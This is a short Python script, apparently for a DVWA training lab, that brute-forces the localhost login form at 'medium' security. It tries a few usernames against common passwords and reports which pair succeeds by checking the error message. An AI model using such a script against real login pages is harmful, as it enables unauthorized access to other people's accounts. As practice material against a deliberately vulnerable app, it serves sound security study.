import requests

target = "http://localhost/DVWA/vulnerabilities/brute/"
payload = {"username": None, "password": None, "Login": "Login"}
cookie = {"security": "medium", "PHPSESSID": "d5tc1vkj3cp7d2ca0rn2m8dhq1"}

username_list = ["root", "admin", "pablo"]
password_list = ["123456", "toor", "pass", "password", "letmein"]

for username in username_list:
	for password in password_list:
		payload["username"] = username
		payload["password"] = password
		req = requests.get(url=target, params=payload, cookies=cookie)
		req = str(req.content)
		if "Username and/or password incorrect." in req:
			print("{}:{} is wrong match.".format(username, password))
		else:
			print("{}:{} is right match.".format(username, password))